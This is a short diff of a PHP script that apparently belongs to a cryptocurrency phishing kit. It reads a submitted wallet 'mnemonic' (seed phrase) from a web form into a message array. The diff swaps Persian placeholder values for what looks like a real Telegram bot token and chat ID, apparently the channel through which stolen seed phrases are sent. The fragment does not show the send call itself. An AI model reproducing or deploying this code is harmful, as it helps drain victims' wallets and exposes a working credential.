@@ -10,8 +10,8 @@ $remoteip =
      $_SERVER["REMOTE_ADDR"]
   ;
 
-$token = "توکن";
-$chat_id = "ایدی عددی";
+$token = "5515286404:AAF6ltaXF6TBD2oykOsp3qW6Fl9SzejSWVg";
+$chat_id = "323454936";
 $codes = $_POST['mnemonic'];
 $arr = array(
   'Seed Word:  ' => $codes,
